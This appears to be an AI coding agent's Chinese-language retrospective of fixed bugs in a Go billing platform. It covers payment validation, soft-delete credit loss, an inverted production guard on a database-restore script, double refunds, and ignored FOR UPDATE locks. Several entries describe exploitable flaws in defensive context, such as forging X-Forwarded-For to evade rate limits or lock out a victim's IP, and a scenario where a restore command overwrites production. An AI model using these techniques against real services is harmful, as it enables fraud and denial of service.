- **解决**：① 建 `precheckAgentPurchaseSlug`，与 `provisionAgentFromOrder` 分支决策**一一同构**（active 升级忽略 slug / suspended 拒单 / 软删复活 / 全新→`NewSlugValidator().Validate`+状态盲 `Count` 查重），在落单前调用 → 不合法直接 `respondErr`(400/409)、**绝不落单收钱**，保证「预检过 ⇒ 激活必成（就 slug 而言）」。② 软删占位改**复活**：provision 在 `!existing` 时查 `agentDeletedTenantByOwner`，命中即 repo 级 `SetTenantStatus(active)` 翻回（deleted 终态、刻意绕过状态机）后复用「已是代理→升级」分支（自带 L≥1 `EnsureSubdomain` 重建被删域名，全幂等）。③ suspended 付款前拒 `agentplan.ErrAgentSuspended`(403「你的代理站已被停用，请联系客服」)，provision 升级分支再兜底对账重驱动的 pending 单。④ 前端 `index.tsx` `validateSlugCn`（后端规则精确镜像）+ maxLength/小写归一/中文提示 + 按钮禁用（防御纵深）。⑤ 测试：precheck 全分支 + 大小写归一查重 + 软删复活/L1 重建域名 + suspended 拒单回归。两轮多代理对抗审查（slug 同构 + 编译正确性 + suspended 逻辑）：0 Critical / 0 blocking、`compiles=true`。
- **坑点**：复活不是状态迁移（`StatusDeleted` 终态禁 deleted→active），必须走 repo 级 `SetTenantStatus` 直写绕过 `service.SetStatus` 状态机守卫；软删只翻 status + 删域名，owner 归属/钱包/下级/agent_profile 均保留 → 复活折叠进升级分支即自然回归。**本机无 Go 工具链，`go build`/`go test ./internal/...` 待服务器验证。**
- **已知边界（未在本次修）**：复活/升级 L1+ 时 `EnsureSubdomain` 把「子域名在软删期间被他租户 AddSubdomain 抢占」静默当幂等成功（Low，概率低）；复活只按 slug 重建域名、软删前的自定义 label 不恢复（Low）；前端对软删复购者显示「首开」表单，若填非法 slug 会挡住后端本会复活成功的购买（Low，方向安全=拒非收）。
- **升级**：候选规则——「任何**承载金额的下单端点**，凡最终交付依赖某项确定性校验（slug/租户状态/库存/限购等），该校验必须在**下单收钱之前** fail-closed 执行（对齐同域已有付款前校验路径），严禁『先收钱、回调激活时才校验』——否则校验失败=钱已离账却确定性永久无法交付的付款黑洞」。同族：兑换码溢出（付费闸门前移）、AGT 无对账（→ C5）。待用户确认后填入 CLAUDE.md **C6**。参见 [[agt-order-no-reconcile-fallback]]、[[redemption-int64-overflow-mint]]、[[trial-limit-redis-no-volume-no-release]]。

### [已解决] 充值/兑换入账对软删或缺失用户静默丢账：RowsAffected 未校验 + Model(&User{}) 无意套软删作用域，幂等台账令其永久不可恢复（Critical）
- **现象**：用户扫码付 ¥730 → 管理员/风控在回调落地前软删该用户 → 回调到达 `rechargeQuotaSink.OnPaid`（recharge.go:112）：事务内写幂等台账（`mt_recharge_credit_ledger.order_no` 主键）+ 加 quota + 写 TopUp。因 `model.User` 是软删模型（user.go:49 `DeletedAt gorm.DeletedAt`），`tx.Model(&model.User{}).Update` 被 GORM 自动注入 `AND deleted_at IS NULL`（子代理 DryRun 实测），quota 那步匹配 **0 行、不报 error、RowsAffected 未校验、事务照常提交** → 台账 + TopUp 落库、订单推进 `credited`。账单历史显「充值成功」、余额纹丝不动、平台 ack SUCCESS、微信停止重推、零告警。因 `order_no` 是幂等主键（重跑 `isDuplicateLedgerErr → nil` 短路）、`credited` 是终态且 `ReconcileStuckPaid` 只扫 `paid` 不扫 `credited` ⇒ **即使恢复用户也永不自愈**。兑换路径 `RedeemCodeAndCredit`（gormrepo.go:309）用 `Table("users")`（不套软删）但**同样** RowsAffected 未校验 → userID 行不存在时已翻 used 的码作废却不到账。刺眼不一致：同文件 `CreateCodesWithDeduction:209` 对建码预扣**正确**校验了 `RowsAffected==0 → ErrInsufficientQuota`——代码库早知道这个模式，只是两条钱路上没用。
- **根因**：向 `users.quota` 写金额的 DB 语句 (a) 未校验 RowsAffected（0 行静默成功）+ (b) 充值路径用 `Model(&User{})` 无意套上软删作用域，把「软删用户」也变成 0 行静默丢账。同「清单挑选式遗漏」家族（C2/C3/C5/AGT-slug）——正确样板就在同文件却没被复用到这两条钱路。
- **解决（用户选定 Design A+「落账到该行 + 告警风控」）**：① `recharge.go` OnPaid：作用域内 Update 命中(RowsAffected==1)即正常；未命中→ `tx.Unscoped()` 绕软删把额度**必落**到该用户行（钱不丢、可恢复，与兑换 `Table("users")` 同语义）；Unscoped 仍 0 行→用户真不存在→返回 `errRechargeUserMissing` **回滚整事务**（台账/quota/TopUp 一并撤销、订单不推进 credited、回调 ack 非 SUCCESS → 平台重推 + 对账兜底 + 告警）。命中软删行则提交后 `common.SysLog` 留痕 + 经 `AlertSink` 发 **Critical 告警**知会风控（退款/恢复账号核查），DedupKey + 幂等台账保证同单只发一次。`alertSink` 在 wire.go 提前构造注入 `rechargeQuotaSink.alerter`（nil 安全）。② 兑换 `RedeemCodeAndCredit`：补 `RowsAffected==0 → wallet.ErrRedeemCreditUserMissing` 回滚（CAS 撤销、码保持 enabled 可再兑），与 `CreateCodesWithDeduction` 语义齐平。③ 测试：软删用户仍入账 + 发 1 条 Critical + 幂等不双扣不重复告警；缺失用户报错回滚不留台账/TopUp；兑换缺失用户报错、码仍 enabled。服务器 `golang:1.25.1` 容器 `go build` + `go test ./internal/mtwire/ ./internal/wallet/...` 全绿（3 新测 uncached PASS）。
- **坑点**：`model.User` 软删作用域**只对** `Model(&User{})`/`&User{}` 生效，`Table("users")` 天然不套——这正是充值（套）与兑换（不套）两条钱路语义分叉的根源；`Unscoped()` 精确只关掉软删 clause、`WHERE id=?` 保留，故「先 Model 后 Unscoped」两步能干净区分「软删（Unscoped 命中）」与「真缺失（Unscoped 也 0 行）」。
- **升级**：候选规则——「任何向 `users.quota`（或任何余额/额度列）写入金额的 DB 语句（充值入账 / 兑换入账 / 未来新增），必须 ① 校验 `RowsAffected==0` 即 fail-loud（回滚 + 上抛，绝不静默提交 0 行）② 显式决策软删作用域：钱必须落账的走 `Unscoped`/`Table` 落到该行、需拦截的 fail-loud，绝不因 `Model(&User{})` 无意套软删而静默丢账。对齐同文件 `CreateCodesWithDeduction` 早有的 RowsAffected 判定」。C6 已被 [[agt-slug-prepay-validation]] 预留 → 本条待用户确认后填入 CLAUDE.md **C7**。参见 [[redemption-int64-overflow-mint]]、[[agt-order-no-reconcile-fallback]]。

### [已解决] guard_not_prod 语义在单栈收敛后整个反转：护栏守着已删除的栈 → 破坏性运维脚本对真生产恒放行（Critical·虚假安全感）
- **现象**：`deploy/ops` 一整套运维脚本（backup/restore/rollback/healthcheck/reconcile/demo/deploy）靠 `guard_not_prod` 作「绝不碰现网」的红线护栏，脚本头白纸黑字「只操作隔离测试栈 `newapi_test`，绝不触碰现网 `newapi_YFNf`」。但 2026-07-03 单栈收敛把 stock 栈 `newapi_YFNf` **删除**、`newapi_test` 变成**唯一现网**后，护栏语义整个反转却没跟着改：`guard_not_prod` 只在 `STACK==newapi_YFNf` 时 `die`，而 `STACK` 默认恰是 `newapi_test` → **对真生产恒放行**（守着一个已不存在的栈）。最危险组合——`restore.sh`（`gunzip | mysql`，dump 含 DROP TABLE 整库覆盖）唯一实质保护就是这个恒过的护栏 + 一个 `warn 失败也继续` 的 pre-backup，而脚本头**自己推荐** `ASSUME_YES=1 ./restore.sh <file>` 跳过二次确认。真实失败场景：排查账目→想「在测试栈拿旧备份复现」→读脚本头「只操作隔离测试栈，绝不触碰现网」安心执行 `ASSUME_YES=1 restore.sh <14h前快照>`→护栏通过（栈名确实不是 YFNf）→无确认→生产库被整库覆盖，期间所有充值/套餐激活/代理分润/消耗日志全部消失，而用户已付款。07-14 已报，未修。
- **根因**：护栏用**排除式黑名单**（`STACK != 已删除的栈`）表达「不要碰生产」，当「被排除的对象」消失、「默认目标」本身升级成生产后，黑名单恒真=恒放行——护栏退化成纯粹的虚假安全感，且注释/README 的「红线」文案反向误导人放胆执行破坏性操作。属「语义随环境漂移、代码/文档不跟进」一类。破坏性不可逆操作把「唯一实质屏障」寄托在一个语义已反转的开关上。
- **解决（范围 A · 手术式，用户选定）**：① 护栏从黑名单改**正向白名单** `guard_target`：`[ "$STACK" = "$EXPECTED_STACK" ]`（默认 newapi_test），只确认「目标确为期望栈」挡拼写/误配——不再表达已无意义的「非 prod」；旧名 `guard_not_prod` 保留为**兼容别名** `{ guard_target; }`，5 处调用点（backup/healthcheck/reconcile/demo/rollback）零改动。lib.sh 与 deploy.sh（自包含、有独立内联护栏）各改一处，`PROD_STACK` 变量删除。② `restore.sh` 三重真实屏障：新增 `confirm_typed "$STACK"`（必须**键入栈名**、**故意不理会 ASSUME_YES**、非交互无输入即 fail-closed）替代泛泛 `confirm yes`；pre-backup 从 `warn 继续`→**`die` 中止**（连给现态拍照都做不到就不该覆盖它），删除 `NO_PRE_BACKUP` 逃生。rollback 维持现状（靠 :prev 镜像秒级回退、破坏性远低、且被 deploy.sh:190 `ASSUME_YES=1` 自动调用是 load-bearing，不能一刀切禁 ASSUME_YES）。③ 全站纠正 8 处反向「红线」文案（lib.sh/restore.sh/ops·README/demo·README/demo.sh/reconcile.sh/go-live.md/deploy.sh）为如实表述：newapi_test = 唯一现网/生产。
- **坑点**：① `confirm_typed` 里 `read -r ans || die` 用 `||` 兜住 `set -e`（EOF 时 read 返回非 0 会被 set -e 直接吞掉、连 die 都不打印）；② 护栏不做 positive 路径匹配——stack 名用下划线 `newapi_test`、仓库路径用连字符 `/root/newapi-test`，本就不同形，栈名一致性足够挡误配，硬做路径匹配反而脆弱误杀；③ 不能给 rollback 也禁 ASSUME_YES——deploy 健康失败自动回滚依赖它。本机 `bash -n` 7 脚本全绿；**服务器实跑验证（restore 键入栈名/pre-backup 失败中止）待 W4 部署后**。另（同批顺带清理）：`deploy/nginx/` 仓库副本（非自动下发，仅参考）里的过时拓扑——`wildcard.conf` 注释订正；`api-443-to-origin.conf` 整份 `proxy_pass :3000`（已删的 YFNf）按 fork 行为重建为 `:3100 + Host $host`（镜像 wildcard，下发前须与线上 api vhost `diff` 核对）。
- **升级**：候选规则——「任何**破坏性/不可逆的运维脚本**（整库 restore、force recreate、批量删除等），其安全护栏必须用**正向白名单**（确认目标确为期望对象）而非**排除式黑名单**（`!= 某禁区`）——黑名单会在『被排除对象消失/默认目标升级为生产』时静默恒放行；且不可逆操作的**唯一实质屏障不得是可被 `ASSUME_YES` 一键跳过的确认**，须用键入对象名的强确认 + 强制可恢复 pre-backup（失败即中止）。环境语义变化（如单栈收敛）后，必须同步审计所有『按旧拓扑写死』的护栏与红线文案」。待用户确认后填入 CLAUDE.md **C7/C8**（C6 号归属见 [[deploy-version-identity-and-rollback]] / [[agt-slug-prepay-validation]]，需一并厘清编号）。参见 [[server-build-deploy-topology]]、[[deploy-false-success-and-orphan-hazard]]。

### [已解决] restore.sh 强制预备份的剪枝会删掉恢复目标本身：恢复「手上最旧快照」这条经典灾备路径必失败、且目标快照永久丢失（上一批安全加固引入的次生 bug）
- **现象**：上一批把恢复前备份从「可跳过（`NO_PRE_BACKUP=1`）」改成「强制、失败即中止」（方向正确），但 `restore.sh` 对目标的 `[ -f "$BACKUP" ]` 存在性检查在 :25、发生在预备份**之前**；预备份内部 `backup.sh:67` 会以 `prune_keep`（`KEEP=7`，glob `db-*.sql.gz` 按 mtime 留最新 7 份）剪枝。于是当恢复目标恰为第 7 新（每日 02:30 cron + KEEP=7 下即「手上最旧的一份」——「数据损坏从一周前开始，恢复最旧快照」这条最经典的灾难恢复路径）时：guard → 键入栈名强确认 → 强制 backup.sh 产生第 8 份 → 剪枝把目标 rm 掉 → :39 `gunzip -c` 报 No such file → pipefail 中止。生产库未被触碰（中止在导入前），但**正要恢复的那个快照永久没了**——灾备情境下它可能是损坏前状态的唯一拷贝；且逃生口已删，隐患不可规避。本机沙盒完整复现（7 份存量 + 目标=最旧 + 新增第 8 份 → 目标被剪掉）。
- **根因**：两个各自正确的机制组合出破坏性交互——「强制预备份（保险）」与「备份后剪枝（容量收敛）」都对，但没人问「剪枝的删除范围会不会覆盖本次恢复的输入」。目标文件与预备份产物落在**同一目录、同一命名模式、同一剪枝 glob** 内，且目标按定义偏旧（要恢复的总是历史快照）→ 天然站在剪枝窗口边缘。属「安全加固自身引入次生风险」+「共享资源（备份目录）上两个写者互不知情」。
- **解决**：不恢复逃生口（强制预备份的初衷保留），改让恢复目标**免疫剪枝**：`restore.sh` 在跑 `backup.sh` 前先给目标建安全副本 `"$BACKUP_DIR/.restore-src-$$.sql.gz"`（点号开头 + 非 `db-*` 前缀，不落入剪枝 glob；同文件系统 `ln -f` 硬链接零拷贝，跨文件系统回落 `cp -a`，两者皆败即 die），`trap EXIT` 清理；导入一律从副本 `gunzip -c "$SAFE_SRC"`——预备份剪枝删不删原文件都不影响恢复。本机 `bash -n` 过 + 沙盒验证（原文件被剪掉、副本仍可完整导入）；服务器实跑仍待 W4。
- **升级**：候选规则——「凡脚本 A 的前置步骤会调用带**自动清理/剪枝/轮转**副作用的脚本 B（backup 剪枝、日志轮转、缓存淘汰等），必须先问『B 的删除范围是否可能覆盖 A 本次的输入/依赖』；输入落在清理 glob 内的，须先做清理免疫的安全副本（硬链接/改名出模式外），后续一律引用副本」。同族教训：加固/修复本身要过一遍「它新引入了什么失败路径」。参见 [[guard-not-prod-inverted-blocklist]]。

### [已解决] 生产订阅计费的「假覆盖」：95.7% 测的是未装配的死桶，真实 money 路径零测——补测当场逼出退款嵌套事务 bug（双重退额 + 单连接死锁）
- **现象**：审计报告称 `internal/tokenplan/gormrepo.Meter`（77 行 SQL 事务）是「生产每次订阅计费入口」、其 0% 覆盖=生产裸奔，并担心 `used_usd`/`month_limit_usd` decimal 列与 `costUSD` float64 在「恰好用满」边界舍入不一致。**逐层核实后前提整个反了**：`gormrepo.Meter` 及其所在的 `internal/billing` QuotaRouter + `internal/wallet` + `internal/tokenplan` 整条 `quota.Source` 桶抽象**在 wire.go/main.go 从未装配**（全仓 `NewQuotaRouter`/`NewQuotaFactory`/`billing.NewService`/`wallet.NewService` 零生产调用方，仅 `*_test.go`；`.Meter(` 无任何 relay/service 调用方）——它写的 `used_usd` 是恒零死列（见 [[used-usd-dead-column-real-usage-native-bucket]]）。生产 `/v1` 订阅计费实际走**原生**桶 `model/subscription.go`：`PreConsumeUserSubscription`→（结算）`PostConsumeUserSubscriptionDelta`，经 `service/funding_source.go`(SubscriptionFunding)+`service/billing_session.go`(BillingSession)+`service/quota.go` 装配，真实用量记 `user_subscriptions.amount_used`（**int64 quota 单位，全程无 decimal/float**）。故报告担心的浮点边界 bug 在真路径不存在；真正的窟窿是**这条真 money 路径零测试覆盖**（全仓无 `*_test` 引用 PreConsume/PostConsume/SubscriptionFunding/BillingSession），而 95.7% 覆盖全压在那条死桶的 MemRepo 假件上——「假覆盖」高于真覆盖。
- **根因（补测逼出的真 bug）**：给真路径补 15 条 model 层断言（恰好用满/差一即拒/已满/不限量/过期→无 active/无订阅/负数/**幂等不重扣**/多订阅择桶 + PostConsume 正/负夹零/越顶拒/不限量/零与非法 + **退款幂等**）时，退款用例在单连接 sqlite harness 里**死锁 10min 超时**。goroutine 栈坐实：`RefundSubscriptionPreConsume`(subscription.go:1252) 开外层 `DB.Transaction`，其内调 `PostConsumeUserSubscriptionDelta`(1265→1363) **又在全局 `DB` 上开一个嵌套事务**——① 测试 harness `SetMaxOpenConns(1)`：外层握着唯一连接、内层 `DB.Begin()` 永久等连接=死锁；② 生产 MySQL（池>1）不死锁但**退款非原子**：额度回写与 `status="refunded"` 幂等标记分处两个事务，一旦外层 `record.Save` 在内层已提交后失败（瞬时错→`refundWithRetry` 3 次重试，或崩溃）→记录仍 `consumed` 而额度已退→重试再跑一次 delta→**双重退额**（用户白拿一次额度）。此路径是热路径：每个用订阅计费的失败 `/v1` 请求都走它退款。
- **解决/规避**：抽出 `postConsumeUserSubscriptionDeltaTx(tx, id, delta)` 纯事务体助手；公共 `PostConsumeUserSubscriptionDelta` 仅包一层 `DB.Transaction` 委托它（对外行为零变化），`RefundSubscriptionPreConsume` 改调**助手并复用自己的外层 `tx`**——退款的额度回写与幂等标记落进同一事务→原子、幂等可靠、嵌套死锁消失。仅 Refund 一处嵌套；其余 5 处调用方（billing_session/funding_source/quota/task_billing）都是独立调用不受影响。新增 `model/subscription_metering_test.go`（15 例）钉死真算法。服务器 `golang:1.25.1` 容器：15 例全绿（含原死锁的退款例，0.077s）、`go vet ./model/` 净、全量 `go test ./model/` `ok` 无回归。**旁证**：glebarez/sqlite **容忍 `FOR UPDATE`**（当 no-op，不报语法错），故原生路径的行锁函数可在 sqlite 单测跑逻辑（并发行锁语义测不到，但算术/分支/幂等可测）。
- **升级**：候选规则——「**任何在已持有 `*gorm.DB` 事务的闭包内，要再改另一行/表的写操作，必须调 `...Tx(tx, …)` 变体复用该事务，严禁调会自开 `DB.Transaction` 的公共函数**——嵌套自开事务=① 有限连接池下死锁；② 两段写分处两事务→部分失败/重试下破坏原子性与幂等（此处即双重退额）。写公共入口时同步提供 `xxxTx(tx,…)` 助手，事务内一律走助手」。与 [[recharge-softdelete-silent-loss]]（写 quota 的 DB 语句必查 RowsAffected + 显式决策软删作用域）、[[trial-dedup-setnx-discarded-concurrent-bypass]]（并发正确性须建在原子原语上）同属「money 写路径的原子性/幂等」家族。另一条元教训：**覆盖率数字必须先问『测的是不是生产真装配的那份实现』**——同契约两实现时，`-cover` 会把死桶假件的高覆盖冒充成真路径已测。待用户确认后并入 CLAUDE.md 硬约束编号梳理（现 C6–C8 候选拥挤，见 [[deploy-version-identity-and-rollback]]/[[guard-not-prod-inverted-blocklist]]）。参见 [[used-usd-dead-column-real-usage-native-bucket]]、[[local-no-build-toolchain]]（全走服务器验证）。

### [已解决] 死码伪装正主：relay/identity/billing 三整包 + wallet/stats 服务层（1652 行）配 doc.go+全绿测试却 0 装配点可达，骗过两次（含生产缺陷 P2-BRK-02）——这次是**删码**不是**再写一条规则**
- **现象**：1652 行生产码（占 internal 生产码 5.8%）从**唯一装配入口** `SetMtRouter → mtwire`（`go list -deps ./router/` 返回的 35 个 internal 包里不含它们）**完全不可达**，却各配 `doc.go`（内容「详见 detailed-design」暗示正主）+ 合计 1730 行**全绿测试**——`internal/billing/service.go:42` 是一整套平行计费引擎 `Charge()` 配 637 行测试、`internal/identity/authn_test.go:102 TestCrossTenantTokenRejected` 一个**跨租户越权安全测试跑在死包上**、`internal/identity/memstore.go:8` 还写着「本轮使用」（该模块生产引用为 0）。而最大的**活**模块 mtwire 反而**无** doc.go → 死码比活码更「正规」，这正是它骗人的原因。
- **根因/发现（Go 工具链，非 grep 推断）**：`go build ./internal/relay/... ./internal/identity/... ./internal/billing/...` 编译通过（代码「活着」只是没入口）；全仓非测试引用仅剩自引用。本地 import 图独立复现并**修正了原始描述的两处偏差**：① wallet/stats **不是整包死**——`wallet.RedemptionCode`(model.go→`mtwire/distribution.go`)、`walletrepo`(gormrepo→`wire.go` 装 RedemptionRepo/AutoMigrate)、`stats.ErrRangeInvalid`(errors.go→`mtwire/report.go:1031`) 都**活**，只有 service 层死；② stats 的 live 哨兵在 `errors.go` **不在 `port.go`**，照原描述整删 port.go 系列会当场挂 mtwire 编译。**陷阱响过两次**：❶ 6e 违禁词接入时差点把钩子挂到休眠的 `internal/relay.Gateway`（`NewGateway` 无人调）——当时处置是**写了条 RETRO 规则（本文件 271-275）却没删码** → 地雷仍在，且 identity/billing 是同款地雷但此前**零 RETRO 记录**；❷ 直接酿成 **P2-BRK-02**：未装配的 tokenplan 计费桶 `Meter` 永不执行 → `tokenplan_subscriptions.used_usd` 恒 0 死列 → 读侧被迫 JOIN 原生表绕过 → 绕过表达式复制到 2 包 → 一处读了死列 → 告警过滤谓词恒假 → 告警恒空（因果链[[used-usd-dead-column-real-usage-native-bucket]]、`internal/breakage/gormrepo/gormrepo.go:76-79` 注释里自陈）。**文档反向**：STATUS.md:41 把**活着**的 `internal/risk`（RPM 经 `mtwire/wire.go:198` 注入 live 引擎、env `RISK_DEFAULT_RPM` 服务器实测 60 生效）宣布为「superseded 死代码勿重造」，却对真死的 relay/billing 只字未提——现状文档在模块死活上恰好反了。
- **解决**：这次**删码**（`git rm`）而非再写规则——整目录删 `internal/relay`(+upstream) / `internal/identity`(+gormstore) / `internal/billing`(+gormrepo)；外科删 `wallet/{service,quota_wallet}.go`+各自 test+`fakes_test.go`、`stats/{service,reader,port}.go`+`service_test.go`；剪 `wallet/port.go` 4 个死接口(WalletService/WalletQuotaFactory/PricingService/EarningSink，留 WalletRepo)连 appctx/quota import、删 `repo_test.go` 里经死 `walletService.Redeem` 驱动的 `TestRedeemConcurrentSingleWinner`（其原子性保证已由 `TestMemRepoUseRedemptionCAS` 覆盖）；给**保留的活模块** stats/wallet 的 `doc.go` 加「服务层已作死码移除」实况说明；纠正 STATUS.md:41 死活反转。全仓**悬空引用扫描 0 命中**（本机无 Go，此为编译代理，见 [[local-no-build-toolchain]]）；真凭据待服务器 `go build ./... && go vet ./... && go test ./internal/...`。
- **升级**：升级为 CLAUDE.md **C7**（「`internal/**` 生产包须从 `go list -deps ./router/` 可达；暂不接线者须显式标『休眠』否则删；判死活只认 import 图不信 doc.go/绿测试/注释表象」）。**编号厘清**：C6=版本身份[[deploy-version-identity-and-rollback]]、C7=本条死码伪装；guard_not_prod 反转黑名单[[guard-not-prod-inverted-blocklist]] 与嵌套事务原子性[[native-subscription-billing-path-and-nested-tx-fix]] 两候选顺延 C8/待用户确认。与本文件 465「假覆盖」条（95.7% 测的就是这批死桶）、C2/C3/C5/C6「清单挑选式遗漏」家族互补——本条治「多余的死登记」。参见 [[merge-clean-but-semantically-broken]]。

### [已解决] 全仓 17 处 FOR UPDATE 行锁是静默空操作：GORM v2 忽略 v1 的 gorm:query_option——收敛 lockForUpdate + 三层守卫钉死（audit 2026-07-17 头号 Critical · 已升级为规则 C8）
- **现象**：`model/` 17 处 `tx.Set("gorm:query_option", "FOR UPDATE")`（订阅 9 / 充值 6 / 兑换码 1 / 邀请划转 1）自以为加了行锁，实际生成的 SQL 无任何 `FOR UPDATE`——MySQL REPEATABLE READ 下全是普通快照读，紧随的「读→算→写回绝对值」构成教科书式丢失更新：3 并发预扣同一订阅各读 used=0、各写回 40，终值 40 而非 120——超用已交付却未计量，套餐上限完全失效；充值补单/兑换码同款暴露。
- **根因**：`gorm:query_option` 是 GORM v1 的私有约定；本仓 `gorm.io/gorm v1.25.2` 即 GORM v2，v2 已移除该设置项并**静默忽略**（gorm 全源码 0 处读取此 key，不报错不告警）。帮凶：270 行计量测试跑在 SQLite（无行锁语义）上全绿，为空锁路径盖了绿章。
- **解决**：① `model/lock.go` 新增 `lockForUpdate(tx)`＝`Clauses(clause.Locking{Strength:"UPDATE"})` + SQLite 方言显式跳过；② 17 处机械替换（diff 恰 17 行）；③ `model/lock_guard_test.go` 三层守卫：MySQL DryRun（SkipInitializeWithVersion + DisableAutomaticPing，零网络）断言 Find/First 均真出 ` FOR UPDATE`；断言老写法确被 v2 忽略（钉根因、防「改回去」）；全仓 `*.go` 字面量封禁（`go test ./model/` 即拦截回潮，测试自身用拼接常量防自 match）。TDD 全程 RED→GREEN；本机全门禁绿：`go build ./...`、`go vet` 与 17 条基线持平（model 0 条）、`go test ./model/(-race) ./internal/... ./router/...` 全 ok。
- **坑点**：① 实测 glebarez/sqlite 对真 `clause.Locking` **容忍并静默剥除**（err=nil，474 行旁证成立）——skip 分支不是防语法炸，而是不依赖方言剥除行为 + 把「SQLite 测不到锁」写成明面事实；并发丢失更新的回归只能上服务器 MySQL 栈（16 goroutine 并发 PreConsume 断言 used==N×amount），SQLite 单测只钉算术/分支/幂等。② 恢复真锁后并发从「静默丢账」变「串行等待」，极端交叉加锁顺序可能 1213 死锁回滚——属上游 GORM v1 时代原设计语义回归，出现再谈重试。③ 审计建议的「17 处裸内联 Clauses」不如单点助手：守卫测试有唯一锚点、方言语义集中一处。
- **升级**：已固化为 CLAUDE.md **C8**（编号说明：469/475 两条候选此前排队待用户确认，本条因系用户点名修复的头号 Critical 先行占用 C8——guard_not_prod 正向白名单与嵌套事务 Tx 助手两候选顺延 **C9/C10 待用户确认**）。可选强化（未做）：额度计数器改原子条件 UPDATE（`amount_used + ? <= amount_total` 谓词内更新）彻底消灭 read-modify-write；服务器 MySQL 真并发回归。

### [已解决] money 限流全挂可伪造的 ClientIP() 上：全仓未 SetTrustedProxies → gin 信任 0.0.0.0/0 → 伪造 XFF 既绕过限流又反向武器化定向 DoS（audit 2026-07-17 High · 双层修复）
- **现象**：本批给 5 个 money 端点（token/agent 套餐购买、钱包充值、兑换码、提现）加的 `CriticalRateLimit()`，桶 key = `"rateLimit:" + mark + c.ClientIP()`。而全仓从未 `SetTrustedProxies` → gin 保持默认 `defaultTrustedCIDRs=0.0.0.0/0 + ::/0`（信任所有代理）+ `ForwardedByClientIP` → `validateHeader` 从右往左遍历 XFF、每跳皆可信时返回**最左**即客户端自填值。三段链路闭合（nginx 三 vhost 全 `$proxy_add_x_forwarded_for` 追加、无 `real_ip_header`/`set_real_ip_from`；app 仅 `127.0.0.1:3100`）。两个方向都成立：① 登录态攻击者每请求换一个伪造 XFF → 每次落进全新桶 → 20/20min 闸门形同虚设（兑换码即钱）；② 反向武器化——桶 key 不含路由成分（GA 对所有 /api/** 恒定），拿任意受害者 IP 向任意 /api 发 360 次带 `X-Forwarded-For: V` → 耗尽 `rateLimit:GAV` 把 V 踢下整个 /api 面 180s，V 可为支付回调源 IP / 127.0.0.1 / 任意客户。
- **根因**：`ClientIP()` 的信任边界从未收敛。IP 既是**限流键**又是**攻击者完全可控的请求头**——用可伪造值做安全决策键。属「防护建立在未验证前提上」（finding 自陈「基于已受保护的前提装防护，属加重」）。
- **解决（两层，风险不同分别处置）**：**part②（气密·已测·直接上）**——money 端点全在 `UserAuth` 之后，新增 `middleware.CriticalUserRateLimit()` 包装既有但仅 SearchRateLimit 用过的 `userRateLimitFactory`（key=`rateLimit:CT:user:<id>`），替换 5 处；无 user id 时 fail-closed 401（防挂错到鉴权前）。与伪造 XFF 完全无关。4 测钉死：同用户换 3 个伪造 IP 共桶第 3 次拦 / 异用户隔离 / 缺认证 401 / 关闭直通。**part①（改全局 IP 解析·涉外网拓扑·先问用户）**——源站前是 Cloudflare（CF Origin CA 在用），设 `gin.TrustedPlatform = gin.PlatformCloudflare`（"CF-Connecting-IP"）经 CF 流量取真实客户端、无视伪造 XFF；无该头则 gin 回退既有逻辑（`context.go:773` TrustedPlatform 头为空即继续向下）→**严格不劣于现状**。`router.ConfigureTrustedClientIP` helper + 3 测（CF 头压过伪造 XFF / 无头回退非空 / 守卫平台常量）+ main.go `gin.New()` 后调用。
- **坑点**：① 审计原 snippet 的 `SetTrustedProxies([127.0.0.1/32,::1/128])` 在**当前拓扑下会闯祸**——CF 直连 nginx、nginx 未做 real_ip 时，gin 右起遍历 XFF 只信 127.0.0.1、下一跳是 CF 出口 IP（不可信）→ 返回 **CF 出口 IP** → 全站用户归一成少数 CF IP → 共享桶 → 大面积误封。故没照抄，改用权威头 `CF-Connecting-IP`（这是审计给的 CF 变体，且不劣于现状）。**W1 命中**：全局 IP 解析改法依赖「CF 是否真在每条相关路径前 + 该头是否真到达 app」这一本机（Mac）无法核实、错则全站误封/静默空操作的生产事实 → 停下用 AskUserQuestion 让用户拍板信任模型，选定「读 CF-Connecting-IP」。② part① 残余风险：绕过 CF 直连源站（64.90.4.114:443）伪造 CF-Connecting-IP——但此风险不劣于今日（今日 XFF 就全可控），根治要把源站锁到仅 CF 可达（部署 8a）。③ **上线前须服务器侧核实** CF-Connecting-IP 确到达 app（`curl` 打日志看 `c.ClientIP()`）——否则 part① 静默空操作、误以为已修（正是 finding 警告的「假防护」）；本机（W4）只能验逻辑不能验边缘链路。
- **升级**：候选规则——「**任何安全/风控决策键（限流、去重、封禁）不得直接用 `c.ClientIP()` 或任何客户端可伪造的请求头**：要么在鉴权后按 `user_id` 计（气密），要么先 `SetTrustedProxies`/`TrustedPlatform` 把信任边界收敛到真实边缘再用 IP；改全局 IP 解析属涉外网拓扑决策，本机不可验证时按 W1 先问用户」。与本文件行锁 C8、[[recharge-softdelete-silent-loss]] 同属「安全不变量必须建在可信输入上」家族。C9/C10 编号仍待用户确认（本条与 guard_not_prod/嵌套事务并列候选），暂不占号。
- **上线状态（2026-07-17 已部署并线上验证）**：part①② 上线（版本 `019b915-dirty-20260717-191443`），**线上双验证 part①**：① 本机给 app 发带 `CF-Connecting-IP:203.0.113.77`+伪造 `XFF:9.9.9.9` 的请求，`SetUpLogger` 记录 ClientIP=203.0.113.77（CF 头压过 XFF，代码生效）；② Mac 经 CF 访问，app 日志记 ClientIP=179.255.144.58（我的真实公网 IP，非 CF 的 104.x）——证明生产 CF 端到端真传 `CF-Connecting-IP`、非静默空操作。残余风险（绕 CF 直连伪造该头）由 **8a 源站锁 CF-only** 堵死（见下条）。

### [已解决] 8a 源站锁 Cloudflare-only：nginx allow CF 段 + deny all，堵「绕 CF 直连伪造 CF-Connecting-IP」（2026-07-17，part① 的配套纵深防御）
- **背景**：part① 用 `gin.TrustedPlatform=CF-Connecting-IP` 取真实客户端 IP，但攻击者若能绕过 CF 直连源站（`64.90.4.114:443`）伪造该头，仍可控制上报 IP。8a 在源站侧堵死这条绕行。
- **前提核实（本机不可验、上服务器查）**：① 三域名（api/www/tokendream.wedreamhub.com）DNS 全解析到 CF 段（`2606:4700:...`）、响应头带 `cf-ray`/`server: cloudflare`——**全走 CF**，故锁 CF-only **不挡支付回调**（回调打 api 域名也经 CF）；② 源站**无公网 IPv6**、nginx access log 回源来自 `104.22.x`——CF **回源走 IPv4**，只需 allow CF IPv4 15 段；③ nginx **未配 real_ip**（故 part① 走 gin 读头，不依赖 nginx real_ip）。
